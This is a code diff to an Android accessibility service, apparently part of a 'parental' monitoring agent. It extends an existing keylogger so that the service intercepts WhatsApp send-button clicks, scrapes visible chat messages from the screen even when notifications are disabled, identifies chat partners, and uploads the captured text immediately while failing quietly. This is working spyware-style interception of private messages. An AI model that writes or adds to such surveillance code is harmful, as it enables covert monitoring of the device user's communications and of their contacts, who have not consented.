@@ -3,6 +3,7 @@ package com.parental.agent.services
 import android.accessibilityservice.AccessibilityService
 import android.content.Context
 import android.content.Intent
+import android.graphics.Rect
 import android.net.Uri
 import android.os.Handler
 import android.os.Looper
@@ -122,6 +123,20 @@ class AgentAccessibilityService : AccessibilityService() {
             // 2. Pure Keystroke Input Engine: Only capture TYPE_VIEW_TEXT_CHANGED for active text inputs
             if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                 captureKeylogData(event, packageName)
+            }
+
+            // 2.2 WhatsApp Outgoing Send Button Click Interceptor
+            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED &&
+                (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b")) {
+                checkAndEmitWhatsAppOutgoingOnSendClick(event, packageName)
+            }
+
+            // 2.5 Active WhatsApp Screen Node Analyzer (Fallback when notifications are disabled)
+            if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
+                if (event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || 
+                    event.eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
+                    captureWhatsAppScreenNodes(rootInActiveWindow ?: event.source, packageName)
+                }
             }
 
             // 3. Google App & Search Widget Query Capture Engine
@@ -442,6 +457,9 @@ class AgentAccessibilityService : AccessibilityService() {
         return null
     }
 
+    @Volatile
+    private var currentDraftViewId: String = ""
+
     private fun captureKeylogData(event: AccessibilityEvent, packageName: String) {
         try {
             val sourceNode = event.source
@@ -459,12 +477,15 @@ class AgentAccessibilityService : AccessibilityService() {
 
             if (capturedText.isBlank()) return
 
+            val viewId = sourceNode?.viewIdResourceName?.lowercase() ?: ""
+
             if (currentDraftPkg.isNotEmpty() && currentDraftPkg != packageName && currentDraftText.isNotBlank()) {
                 flushCurrentDraftNow()
             }
 
             currentDraftPkg = packageName
             currentDraftText = capturedText
+            currentDraftViewId = viewId
 
             pendingFlushRunnable?.let { mainHandler.removeCallbacks(it) }
 
@@ -567,6 +588,261 @@ class AgentAccessibilityService : AccessibilityService() {
             } catch (e: Exception) {
                 Log.e(TAG, "Error saving keylog event: ${e.message}")
             }
+        }
+    }
+
+    @Volatile
+    private var lastCapturedTitle: String = ""
+
+    @Volatile
+    private var lastOutgoingSentText: String = ""
+    @Volatile
+    private var lastOutgoingSentTimestamp: Long = 0L
+
+    private fun checkAndEmitWhatsAppOutgoingOnSendClick(event: AccessibilityEvent, packageName: String) {
+        try {
+            val sourceNode = event.source ?: return
+            val viewId = sourceNode.viewIdResourceName?.lowercase() ?: ""
+            val contentDesc = sourceNode.contentDescription?.toString()?.lowercase() ?: ""
+
+            // Verify the clicked button is the WhatsApp Send button (com.whatsapp:id/send or Send button)
+            val isSendButton = viewId.contains("send") || contentDesc.contains("send")
+            if (!isSendButton) return
+
+            // Extract the last typed draft text for WhatsApp
+            val textToSend = currentDraftText.trim().ifBlank { lastFlushedText.trim() }
+            if (textToSend.isBlank()) return
+
+            val now = System.currentTimeMillis()
+            lastOutgoingSentText = textToSend
+            lastOutgoingSentTimestamp = now
+
+            val waAppName = if (packageName == "com.whatsapp.w4b") "WhatsApp Business" else "WhatsApp"
+            val waEventId = "evt_wa_out_${now}"
+
+            Log.i(TAG, "⚡ WHATSAPP OUTGOING MESSAGE SENT (ON SEND CLICK): Text=\"$textToSend\"")
+
+            val detectedTitle = extractWhatsAppChatTitle(sourceNode, packageName)
+            if (detectedTitle.isNotBlank()) {
+                lastCapturedTitle = detectedTitle
+            }
+            val finalTitle = if (detectedTitle.isNotBlank()) detectedTitle else (lastCapturedTitle.ifBlank { "Active Chat" })
+
+            val waPayload = JSONObject().apply {
+                put("sender", "Me")
+                put("message", textToSend)
+                put("packageName", packageName)
+                put("appName", waAppName)
+                put("isOutgoing", true)
+                put("timestamp", now)
+                put("chatTitle", finalTitle)
+            }
+
+            val waEntity = NormalizedEventEntity(
+                eventId = waEventId,
+                deviceId = prefsDeviceId(),
+                source = "whatsapp",
+                eventType = "chat_message",
+                timestamp = now,
+                collectionMethod = "accessibility",
+                payloadJson = waPayload.toString(),
+                isSynced = false
+            )
+
+            CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    val database = AppDatabase.getInstance(applicationContext)
+                    database.eventDao().insertEvent(waEntity)
+                    performInstantUpload(database, prefsDeviceId())
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error saving WhatsApp outgoing send click event: ${e.message}")
+                }
+            }
+        } catch (e: Exception) {
+            // Quiet fail
+        }
+    }
+
+    @Volatile
+    private var lastCapturedScreenText: String = ""
+
+    private fun extractWhatsAppChatTitle(node: AccessibilityNodeInfo?, packageName: String): String {
+        if (node == null) return ""
+        try {
+            val root = node.window?.root ?: rootInActiveWindow ?: node
+            val possibleIds = listOf(
+                "$packageName:id/conversation_contact_name",
+                "$packageName:id/name",
+                "$packageName:id/conversation_title",
+                "$packageName:id/action_bar_title"
+            )
+            for (viewId in possibleIds) {
+                val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
+                if (!nodes.isNullOrEmpty()) {
+                    for (n in nodes) {
+                        val text = n.text?.toString()?.trim()
+                        if (!text.isNullOrBlank() && text != "WhatsApp" && !text.contains("Search", ignoreCase = true)) {
+                            Log.d(TAG, "🔍 [WA CHAT TITLE MATCH] Found title \"$text\" via ID=\"$viewId\"")
+                            return text
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            // Quiet fail
+        }
+        return ""
+    }
+
+    private fun findStatusNodeDetails(parent: AccessibilityNodeInfo?): String? {
+        if (parent == null) return null
+        return try {
+            val possibleStatusIds = listOf(
+                "com.whatsapp:id/status",
+                "com.whatsapp:id/msg_status",
+                "com.whatsapp:id/status_icon",
+                "com.whatsapp.w4b:id/status",
+                "com.whatsapp.w4b:id/msg_status",
+                "com.whatsapp.w4b:id/status_icon"
+            )
+            for (statusId in possibleStatusIds) {
+                val nodes = parent.findAccessibilityNodeInfosByViewId(statusId)
+                if (!nodes.isNullOrEmpty()) {
+                    for (n in nodes) {
+                        val desc = n.contentDescription?.toString()?.trim() ?: ""
+                        val text = n.text?.toString()?.trim() ?: ""
+                        val cls = n.className?.toString()?.substringAfterLast(".") ?: "View"
+                        return "ID=\"$statusId\", Desc=\"$desc\", Text=\"$text\", Class=$cls"
+                    }
+                }
+            }
+            null
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    private fun isNodeOutgoingMessage(node: AccessibilityNodeInfo, msgText: String): Boolean {
+        // 1. Recent Send Button click match
+        if (msgText.isNotBlank() && msgText == lastOutgoingSentText && (System.currentTimeMillis() - lastOutgoingSentTimestamp) < 10000L) {
+            Log.d(TAG, "🔍 [WA MSG MATCH] \"$msgText\" matched recent send click -> OUTGOING = TRUE")
+            return true
+        }
+
+        // 2. Check ONLY the specific message row container (up to depth 3, stopping before list containers)
+        var curr: AccessibilityNodeInfo? = node
+        var depth = 0
+
+        while (curr != null && depth <= 3) {
+            val viewId = curr.viewIdResourceName?.lowercase() ?: ""
+
+            // Stop climbing if we hit the chat list or root container!
+            if (viewId.contains("list") || viewId.contains("conversation_layout") || viewId.contains("recycler") || viewId.contains("root")) {
+                Log.d(TAG, "  🔍 [WA MSG SEARCH STOPPED] Reached list container ID=\"$viewId\" at depth $depth")
+                break
+            }
+
+            val statusDetails = findStatusNodeDetails(curr)
+            if (statusDetails != null) {
+                Log.d(TAG, "🔍 [WA MSG DIRECTION] Status node found ($statusDetails) at depth $depth for text \"$msgText\" -> OUTGOING = TRUE")
+                return true
+            }
+
+            curr = curr.parent
+            depth++
+        }
+
+        Log.d(TAG, "🔍 [WA MSG DIRECTION] No status node found in single row container for text \"$msgText\" -> OUTGOING = FALSE (INCOMING)")
+        return false
+    }
+
+    private fun logWhatsAppViewTreeInspector(node: AccessibilityNodeInfo?, depth: Int = 0) {
+        if (node == null || depth > 25) return
+        try {
+            val vId = node.viewIdResourceName ?: "no_id"
+            val textStr = node.text?.toString()?.trim() ?: ""
+            val cdStr = node.contentDescription?.toString()?.trim() ?: ""
+            val cls = node.className?.toString()?.substringAfterLast(".") ?: "View"
+            val indent = "  ".repeat(depth)
+
+            val bounds = Rect()
+            node.getBoundsInScreen(bounds)
+            val boundsStr = "[${bounds.left},${bounds.top},${bounds.right},${bounds.bottom}]"
+
+            // Log EVERY element that has an ID, text, contentDescription, or children
+            if (vId != "no_id" || textStr.isNotBlank() || cdStr.isNotBlank()) {
+                Log.d(TAG, "🔍 [WA ID INSPECTOR] ${indent}Depth [$depth]: ID=\"$vId\", Class=$cls, Text=\"$textStr\", Desc=\"$cdStr\", Bounds=$boundsStr, Children=${node.childCount}")
+            }
+
+            for (i in 0 until node.childCount) {
+                logWhatsAppViewTreeInspector(node.getChild(i), depth + 1)
+            }
+        } catch (e: Exception) {
+            // Quiet fail
+        }
+    }
+
+    private fun captureWhatsAppScreenNodes(rootNode: AccessibilityNodeInfo?, packageName: String) {
+        if (rootNode == null) return
+        try {
+            // Print full visible WhatsApp View hierarchy with ALL view IDs to Logcat for inspection
+            // Log.d(TAG, "========== 🔍 START WHATSAPP VIEW TREE ID INSPECTOR ==========")
+            // logWhatsAppViewTreeInspector(rootNode)
+            // Log.d(TAG, "========== 🔍 END WHATSAPP VIEW TREE ID INSPECTOR ==========")
+
+            val viewIdToSearch = "$packageName:id/message_text"
+            val nodes = rootNode.findAccessibilityNodeInfosByViewId(viewIdToSearch)
+            if (nodes.isNullOrEmpty()) return
+
+            val lastMsgNode = nodes.lastOrNull() ?: return
+            val msgText = lastMsgNode.text?.toString()?.trim() ?: return
+
+            if (msgText.isBlank() || msgText.length < 2 || msgText == lastCapturedScreenText) return
+            lastCapturedScreenText = msgText
+
+            val isOutgoingMsg = isNodeOutgoingMessage(lastMsgNode, msgText)
+            val now = System.currentTimeMillis()
+            val waAppName = if (packageName == "com.whatsapp.w4b") "WhatsApp Business" else "WhatsApp"
+            val eventId = if (isOutgoingMsg) "evt_wa_out_${now}" else "evt_wa_scr_${now}"
+
+            val detectedTitle = extractWhatsAppChatTitle(rootNode, packageName)
+            val finalTitle = if (detectedTitle.isNotBlank()) detectedTitle else (lastCapturedTitle.ifBlank { "WhatsApp Contact" })
+            val msgSender = if (isOutgoingMsg) "Me" else finalTitle
+
+            Log.i(TAG, "📱 WHATSAPP SCREEN NODE CAPTURED: Sender=\"$msgSender\", Outgoing=$isOutgoingMsg, Title=\"$finalTitle\", Text=\"$msgText\"")
+
+            val payload = JSONObject().apply {
+                put("sender", msgSender)
+                put("message", msgText)
+                put("packageName", packageName)
+                put("appName", waAppName)
+                put("isOutgoing", isOutgoingMsg)
+                put("timestamp", now)
+                put("chatTitle", finalTitle)
+            }
+
+            val eventEntity = NormalizedEventEntity(
+                eventId = eventId,
+                deviceId = prefsDeviceId(),
+                source = "whatsapp",
+                eventType = "chat_message",
+                timestamp = now,
+                collectionMethod = "accessibility",
+                payloadJson = payload.toString(),
+                isSynced = false
+            )
+
+            CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    val database = AppDatabase.getInstance(applicationContext)
+                    database.eventDao().insertEvent(eventEntity)
+                    performInstantUpload(database, prefsDeviceId())
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error saving screen node WhatsApp event: ${e.message}")
+                }
+            }
+        } catch (e: Exception) {
+            // Quiet fail
         }
     }
 
